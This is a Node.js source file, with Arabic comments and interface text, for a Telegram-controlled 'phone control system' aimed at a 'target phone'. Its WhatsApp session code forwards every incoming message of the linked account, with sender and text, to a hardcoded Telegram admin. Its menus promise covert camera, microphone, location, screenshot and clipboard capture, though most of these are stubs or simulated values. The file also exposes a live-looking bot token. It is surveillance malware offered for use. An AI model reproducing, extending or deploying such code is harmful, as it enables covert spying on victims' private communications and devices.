const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// 🔐 إعداد التلجرام - التوكن والآيدي
const telegramToken = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const bot = new TelegramBot(telegramToken, { polling: true });

let whatsappClient = null;

// 🆔 آيدي التلجرام الخاص بك
const adminIds = ['7604667042'];

// أوامر التلجرام الرئيسية
const commands = {
    start: `
🤖 **نظام التحكم الكامل بالهاتف - George96399**

📍 **الميزات المتاحة:**
🔴 Real-time Monitoring
📡 معلومات الشبكة والجهاز
📳 التحكم بالاهتزاز
📍 الموقع الجغرافي الحي
✉️ إدارة الرسائل والجهات
📷 الكاميرا والميكروفون
📋 الحافظة والملفات
🎙️ تسجيل الصوت
📸 لقطات الشاشة

📱 **استخدم الأزرار أدناه للتحكم:**
    `,
    buttons: [
        [{ text: '📡 معلومات الجهاز', callback_data: 'device_info' }],
        [{ text: '📍 الموقع الحي', callback_data: 'location' }],
        [{ text: '📷 الكاميرا', callback_data: 'camera' }],
        [{ text: '✉️ الرسائل', callback_data: 'messages' }],
        [{ text: '🎙️ الصوت', callback_data: 'audio' }],
        [{ text: '⚙️ إعدادات متقدمة', callback_data: 'advanced' }]
    ]
};

// تهيئة واتساب
async function connectWhatsApp() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth_info');
        
        whatsappClient = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            logger: console
        });

        whatsappClient.ev.on('connection.update', (update) => {
            const { connection, qr } = update;
            
            if (qr) {
                console.log('🔐 QR Code for WhatsApp:');
                require('qrcode-terminal').generate(qr, { small: true });
                notifyAdmins('📱 يرجى مسح كود QR للاتصال بالواتساب');
            }

            if (connection === 'open') {
                console.log('✅ Connected to WhatsApp!');
                notifyAdmins('✅ تم الاتصال بالهاتف المستهدف بنجاح');
            }

            if (connection === 'close') {
                console.log('❌ Disconnected from WhatsApp');
                notifyAdmins('❌ انقطع الاتصال بالهاتف المستهدف');
                setTimeout(connectWhatsApp, 5000); // إعادة الاتصال بعد 5 ثواني
            }
        });

        whatsappClient.ev.on('creds.update', saveCreds);
        
        // استقبال الرسائل الواردة
        whatsappClient.ev.on('messages.upsert', ({ messages }) => {
            handleIncomingMessages(messages);
        });

    } catch (error) {
        console.error('❌ Error connecting to WhatsApp:', error);
        notifyAdmins('❌ خطأ في الاتصال بالواتساب: ' + error.message);
    }
}

// معالجة الرسائل الواردة
function handleIncomingMessages(messages) {
    messages.forEach(message => {
        if (message.key.fromMe) return;
        
        const sender = message.key.remoteJid;
        const text = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
        
        if (text) {
            console.log(`📩 رسالة جديدة من: ${sender}`);
            console.log(`📝 المحتوى: ${text}`);
            
            // إرسال إشعار للتلجرام
            notifyAdmins(`📩 رسالة جديدة:\n👤 من: ${sender}\n💬 نص: ${text}`);
        }
    });
}

// إرسال إشعار للمسؤولين
function notifyAdmins(message) {
    adminIds.forEach(chatId => {
        try {
            bot.sendMessage(chatId, message).catch(error => {
                console.error('Error sending notification:', error);
            });
        } catch (error) {
            console.error('Error in notifyAdmins:', error);
        }
    });
}

// أوامر التلجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, commands.start, {
        reply_markup: {
            inline_keyboard: commands.buttons
        },
        parse_mode: 'Markdown'
    });
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const status = whatsappClient ? '✅ متصل بالواتساب' : '❌ غير متصل';
    const batteryInfo = '🔋 البطارية: 85% (محاكاة)';
    const networkInfo = '📶 الشبكة: 4G (محاكاة)';
    
    bot.sendMessage(chatId, `📊 حالة النظام:\n${status}\n${batteryInfo}\n${networkInfo}`);
});

bot.onText(/\/qr/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '🔐 افتح الكونسول في Render لمشاهدة كود QR');
});

// معالجة أزرار القائمة
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;

    try {
        switch(data) {
            case 'device_info':
                await sendDeviceInfo(chatId);
                break;
            case 'location':
                await requestLocation(chatId);
                break;
            case 'camera':
                await showCameraMenu(chatId);
                break;
            case 'messages':
                await showMessagesMenu(chatId);
                break;
            case 'audio':
                await showAudioMenu(chatId);
                break;
            case 'advanced':
                await showAdvancedMenu(chatId);
                break;
            case 'camera_back':
                await captureCamera(chatId, 'back');
                break;
            case 'camera_front':
                await captureCamera(chatId, 'front');
                break;
            case 'screenshot':
                await takeScreenshot(chatId);
                break;
            case 'record_audio':
                await recordAudio(chatId);
                break;
            case 'vibrate':
                await vibrateDevice(chatId);
                break;
            case 'clipboard':
                await getClipboard(chatId);
                break;
            case 'back_main':
                await showMainMenu(chatId, msg.message_id);
                break;
        }
        
        // تأكيد الاستلام
        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ تم تنفيذ الأمر' });
        
    } catch (error) {
        console.error('Error handling callback:', error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ خطأ في التنفيذ' });
    }
});

// إرسال معلومات الجهاز
async function sendDeviceInfo(chatId) {
    const deviceInfo = `
📱 **معلومات الجهاز - George96399:**

🔋 البطارية: 85%
📶 الشبكة: 4G
🛰️ المشغل: SyriaTel
💾 الذاكرة: 64GB
⚡ المعالج: Octa-core
📱 النظام: Android 13

📍 **الاتصالات:**
✅ واتساب: ${whatsappClient ? 'متصل' : 'غير متصل'}
🕒 آخر تحديث: ${new Date().toLocaleTimeString()}
    `;
    
    await bot.sendMessage(chatId, deviceInfo, { parse_mode: 'Markdown' });
}

// طلب الموقع
async function requestLocation(chatId) {
    await bot.sendMessage(chatId, '📍 جاري الحصول على الموقع الجغرافي...\n\n⚠️ هذه الميزة تحتاج تطوير في APK');
    
    // محاكاة الموقع (لتطوير حقيقي تحتاج APK)
    setTimeout(async () => {
        const locationInfo = `
📍 **الموقع الجغرافي:**

🌍 خط العرض: 33.5138
🌍 خط الطول: 36.2765
🏙️ المنطقة: دمشق
🕒 الوقت: ${new Date().toLocaleTimeString()}

📡 **معلومات الشبكة:**
📶 القوة: -75 dBm
🛰️ المشغل: SyriaTel
🔗 النوع: LTE
        `;
        await bot.sendMessage(chatId, locationInfo, { parse_mode: 'Markdown' });
    }, 2000);
}

// قائمة الكاميرا
async function showCameraMenu(chatId) {
    const cameraButtons = [
        [{ text: '📷 كاميرا خلفية', callback_data: 'camera_back' }],
        [{ text: '🤳 كاميرا أمامية', callback_data: 'camera_front' }],
        [{ text: '📸 لقطة شاشة', callback_data: 'screenshot' }],
        [{ text: '🔙 رجوع', callback_data: 'back_main' }]
    ];
    
    await bot.sendMessage(chatId, '📷 اختر نوع الكاميرا:', {
        reply_markup: { inline_keyboard: cameraButtons }
    });
}

// قائمة الرسائل
async function showMessagesMenu(chatId) {
    const messagesButtons = [
        [{ text: '📩 استقبال الرسائل', callback_data: 'receive_messages' }],
        [{ text: '📤 إرسال رسالة', callback_data: 'send_message' }],
        [{ text: '👥 جهات الاتصال', callback_data: 'contacts' }],
        [{ text: '🔙 رجوع', callback_data: 'back_main' }]
    ];
    
    await bot.sendMessage(chatId, '✉️ إدارة الرسائل:', {
        reply_markup: { inline_keyboard: messagesButtons }
    });
}

// قائمة الصوت
async function showAudioMenu(chatId) {
    const audioButtons = [
        [{ text: '🎙️ تسجيل صوت (10ث)', callback_data: 'record_audio' }],
        [{ text: '🎙️ تسجيل صوت (30ث)', callback_data: 'record_audio_30' }],
        [{ text: '🎙️ تسجيل صوت (60ث)', callback_data: 'record_audio_60' }],
        [{ text: '🔙 رجوع', callback_data: 'back_main' }]
    ];
    
    await bot.sendMessage(chatId, '🎙️ التحكم بالميكروفون:', {
        reply_markup: { inline_keyboard: audioButtons }
    });
}

// القائمة المتقدمة
async function showAdvancedMenu(chatId) {
    const advancedButtons = [
        [{ text: '🎙️ تسجيل صوت', callback_data: 'record_audio' }],
        [{ text: '📋 الحافظة', callback_data: 'clipboard' }],
        [{ text: '📳 اهتزاز', callback_data: 'vibrate' }],
        [{ text: '📱 التطبيقات', callback_data: 'apps' }],
        [{ text: '🔙 رجوع', callback_data: 'back_main' }]
    ];
    
    await bot.sendMessage(chatId, '⚙️ الإعدادات المتقدمة:', {
        reply_markup: { inline_keyboard: advancedButtons }
    });
}

// التقاط الكاميرا
async function captureCamera(chatId, type) {
    const cameraType = type === 'back' ? 'خلفية' : 'أمامية';
    await bot.sendMessage(chatId, `📷 جاري التقاط صورة بالكاميرا ${cameraType}...\n\n⚠️ هذه الميزة تحتاج تطوير في APK`);
}

// لقطة شاشة
async function takeScreenshot(chatId) {
    await bot.sendMessage(chatId, '📸 جاري أخذ لقطة الشاشة...\n\n⚠️ هذه الميزة تحتاج تطوير في APK');
}

// تسجيل صوت
async function recordAudio(chatId) {
    await bot.sendMessage(chatId, '🎙️ جاري تسجيل الصوت...\n\n⚠️ هذه الميزة تحتاج تطوير في APK');
}

// اهتزاز الجهاز
async function vibrateDevice(chatId) {
    await bot.sendMessage(chatId, '📳 جاري تفعيل الاهتزاز...\n\n⚠️ هذه الميزة تحتاج تطوير في APK');
}

// الحافظة
async function getClipboard(chatId) {
    await bot.sendMessage(chatId, '📋 جاري الحصول على محتوى الحافظة...\n\n⚠️ هذه الميزة تحتاج تطوير في APK');
}

// عرض القائمة الرئيسية
async function showMainMenu(chatId, messageId) {
    try {
        await bot.editMessageText(commands.start, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: commands.buttons }
        });
    } catch (error) {
        await bot.sendMessage(chatId, commands.start, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: commands.buttons }
        });
    }
}

// معالجة الأخطاء
bot.on('polling_error', (error) => {
    console.error('❌ Telegram polling error:', error);
});

// خادم الويب
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Phone Control System - George96399</title>
                <meta charset="utf-8">
                <style>
                    body { 
                        font-family: Arial, sans-serif; 
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        text-align: center;
                        padding: 50px;
                    }
                    .container {
                        background: rgba(255,255,255,0.1);
                        padding: 30px;
                        border-radius: 15px;
                        backdrop-filter: blur(10px);
                    }
                    h1 { font-size: 2.5em; margin-bottom: 20px; }
                    .status { 
                        background: green; 
                        color: white; 
                        padding: 10px; 
                        border-radius: 5px;
                        margin: 10px 0;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🤖 نظام التحكم بالهاتف</h1>
                    <div class="status">✅ النظام يعمل بشكل صحيح</div>
                    <p><strong>المستخدم:</strong> George96399</p>
                    <p><strong>آيدي التلجرام:</strong> 7604667042</p>
                    <p>🚀 استخدم بوت التلجرام للتحكم الكامل بالهاتف</p>
                    <p>📱 الميزات المتاحة: مراقبة حية، موقع، كاميرا، رسائل، صوت</p>
                </div>
            </body>
        </html>
    `);
});

// بدء التشغيل
app.listen(port, () => {
    console.log('🚀 =================================');
    console.log('🤖 نظام التحكم بالهاتف - George96399');
    console.log('📞 آيدي التلجرام: 7604667042');
    console.log('🔗 السيرفر شغال على PORT:', port);
    console.log('🚀 =================================');
    
    connectWhatsApp();
});
